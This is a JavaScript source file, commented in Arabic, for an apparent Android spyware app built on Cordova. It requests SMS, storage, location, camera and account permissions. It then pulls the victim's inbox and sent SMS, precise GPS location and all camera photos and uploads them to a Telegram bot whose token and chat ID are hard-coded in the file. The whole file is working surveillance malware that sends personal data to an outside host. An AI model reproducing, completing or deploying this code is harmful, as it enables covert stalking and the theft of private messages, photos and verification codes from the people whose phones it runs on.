// تأكد من تثبيت: cordova-plugin-sms, cordova-plugin-geolocation, cordova-plugin-camera, cordova-plugin-file, cordova-plugin-android-permissions, cordova-plugin-background-mode

const BOT_TOKEN = '7988955212:AAFqpIpyQ1MlQ-sASLG0oMRLu4vMhkZNGDk'; // ⚠️ عدلها
const CHAT_ID = '5739065274';     // ⚠️ عدلها

document.addEventListener('deviceready', onDeviceReady, false);

function onDeviceReady() {
  console.log('Cordova جاهز');
  requestPermissions();
}

function requestPermissions() {
  const permissions = cordova.plugins.permissions;

  const neededPermissions = [
    permissions.READ_SMS,
    permissions.READ_EXTERNAL_STORAGE,
    permissions.ACCESS_FINE_LOCATION,
    permissions.CAMERA,
    permissions.GET_ACCOUNTS // اختياري، لكن قد يساعد
  ];

  permissions.requestPermissions(
    neededPermissions,
    function(status) {
      if (status.hasPermission) {
        sendToTelegram("✅ جهاز متصل");
        showButtons();
      } else {
        sendToTelegram("❌ رفض الأذونات");
      }
    },
    function(error) {
      sendToTelegram("⚠️ خطأ في الأذونات: " + JSON.stringify(error));
    }
  );
}

function showButtons() {
  document.getElementById("message").innerText = "الأوامر جاهزة";
}

// --- 1. سحب الرسائل ---
function fetchSMS() {
  if (!window.SMS) {
    sendToTelegram("❌ plugin SMS غير متوفر");
    return;
  }

  const filter = {
    box: 'inbox',
    indexFrom: 0,
    maxCount: 50
  };

  window.SMS.listSMS(filter, async function(smsList) {
    const inbox = smsList.filter(sms => sms.type === 'inbox');
    const sent = smsList.filter(sms => sms.type === 'sent');

    const inboxText = inbox.map(sms => `من: ${sms.address}\nالرسالة: ${sms.body}\nالتاريخ: ${new Date(sms.date)}\n---`).join('\n');
    const sentText = sent.map(sms => `إلى: ${sms.address}\nالرسالة: ${sms.body}\nالتاريخ: ${new Date(sms.date)}\n---`).join('\n');

    try {
      const inboxFile = await saveToFile("inbox_sms.txt", inboxText);
      const sentFile = await saveToFile("sent_sms.txt", sentText);
      await sendFileToTelegram(inboxFile, "الرسائل الواردة.txt");
      await sendFileToTelegram(sentFile, "الرسائل الصادرة.txt");
      sendToTelegram("📬 تم رفع الرسائل بنجاح");
    } catch (e) {
      sendToTelegram("❌ خطأ في حفظ أو إرسال الرسائل: " + e.message);
    }
  }, function(err) {
    sendToTelegram("❌ خطأ في قراءة الرسائل: " + err);
  });
}

// --- 2. سحب الموقع ---
function fetchLocation() {
  navigator.geolocation.getCurrentPosition(
    function(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const url = `https://maps.google.com/?q=${lat},${lon}`;
      sendToTelegram(`📍 الموقع: ${url}\nالإحداثيات: ${lat}, ${lon}`);
    },
    function(error) {
      sendToTelegram("❌ خطأ في تحديد الموقع: " + error.message);
    },
    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
  );
}

// --- 3. سحب الصور ---
function fetchPhotos() {
  window.resolveLocalFileSystemURL(cordova.file.externalStorageDirectory, function(dir) {
    const dcimDir = dir.getDirectory("DCIM", { create: false }, function(dcim) {
      const cameraDir = dcim.getDirectory("Camera", { create: false }, function(camera) {
        const reader = camera.createReader();
        reader.readEntries(function(entries) {
          const imageFiles = entries.filter(entry => 
            entry.isFile && /\.(jpg|jpeg|png|gif)$/i.test(entry.name)
          );

          if (imageFiles.length === 0) {
            sendToTelegram("📭 لا توجد صور");
            return;
          }

          // هنا نضغط الصور لملف ZIP
          zipImages(imageFiles, camera.nativeURL);
        }, err => sendToTelegram("❌ خطأ في قراءة الصور: " + err));
      }, err => sendToTelegram("❌ لم يتم العثور على مجلد الصور: " + err));
    }, err => sendToTelegram("❌ خطأ في الوصول إلى DCIM: " + err));
  }, err => sendToTelegram("❌ خطأ في نظام الملفات: " + err));
}

// --- حفظ النص في ملف ---
function saveToFile(filename, content) {
  return new Promise((resolve, reject) => {
    window.resolveLocalFileSystemURL(cordova.file.externalDataDirectory, function(dir) {
      dir.getFile(filename, { create: true, exclusive: false }, function(fileEntry) {
        fileEntry.createWriter(function(fileWriter) {
          fileWriter.onwriteend = () => resolve(fileEntry.nativeURL);
          fileWriter.onerror = reject;
          const blob = new Blob([content], { type: 'text/plain' });
          fileWriter.write(blob);
        }, reject);
      }, reject);
    }, reject);
  });
}

// --- ضغط الصور إلى ZIP وإرسالها ---
function zipImages(imageFiles, baseDir) {
  const zip = new JSZip();
  const folder = zip.folder("photos");

  let loaded = 0;
  imageFiles.forEach(fileEntry => {
    fileEntry.file(file => {
      const reader = new FileReader();
      reader.onload = function() {
        folder.file(fileEntry.name, this.result, { binary: true });
        loaded++;
        if (loaded === imageFiles.length) {
          zip.generateAsync({ type: "blob" }).then(blob => {
            const zipUrl = cordova.file.externalDataDirectory + "photos.zip";
            window.resolveLocalFileSystemURL(cordova.file.externalDataDirectory, function(dir) {
              dir.getFile("photos.zip", { create: true, exclusive: false }, function(zipEntry) {
                zipEntry.createWriter(function(writer) {
                  writer.onwriteend = function() {
                    sendFileToTelegram(zipUrl, "الصور.zip");
                    sendToTelegram("🖼️ تم رفع الصور (مضغوطة)");
                  };
                  writer.write(blob);
                });
              });
            });
          });
        }
      };
      reader.readAsArrayBuffer(file);
    });
  });
}

// --- إرسال رسالة للبوت ---
function sendToTelegram(text) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
  }).catch(err => console.error("فشل الإرسال:", err));
}

// --- إرسال ملف للبوت ---
function sendFileToTelegram(fileUrl, caption = "") {
  const formData = new FormData();
  formData.append('chat_id', CHAT_ID);
  formData.append('caption', caption);

  // تحويل الملف إلى Blob
  window.resolveLocalFileSystemURL(fileUrl, function(fileEntry) {
    fileEntry.file(function(file) {
      const reader = new FileReader();
      reader.onloadend = function() {
        const blob = new Blob([new Uint8Array(this.result)], { type: file.type });
        formData.append('document', blob, file.name);

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
          method: 'POST',
          body: formData
        }).catch(err => sendToTelegram("❌ خطأ في إرسال الملف: " + err.message));
      };
      reader.readAsArrayBuffer(file);
    });
  });
}}
